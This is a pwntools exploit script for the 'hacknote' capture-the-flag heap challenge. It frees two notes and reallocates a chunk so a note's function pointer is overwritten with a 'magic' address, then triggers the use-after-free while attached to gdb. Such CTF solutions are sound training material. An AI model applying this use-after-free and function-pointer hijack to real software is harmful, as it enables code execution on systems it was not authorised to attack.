from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./hacknote"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice :",str(idx))

def add(length,content):
    opt(1)
    p.sendlineafter("Note size :",str(length))
    p.sendlineafter("Content :",str(content))

def free(idx):
    opt(2)
    p.sendlineafter("Index :",str(idx))

def list(idx):
    opt(3)
    p.sendlineafter("Index :",str(idx))

magic = 0x400bd1

add(0x30,"a"*8)
add(0x30,"b"*8)

free(1)
free(0)

add(0x10,p64(magic))
gdb.attach(p,"tracemalloc on\nset $g=0x6020C0,$h=0x603000")
list(1)

p.interactive()
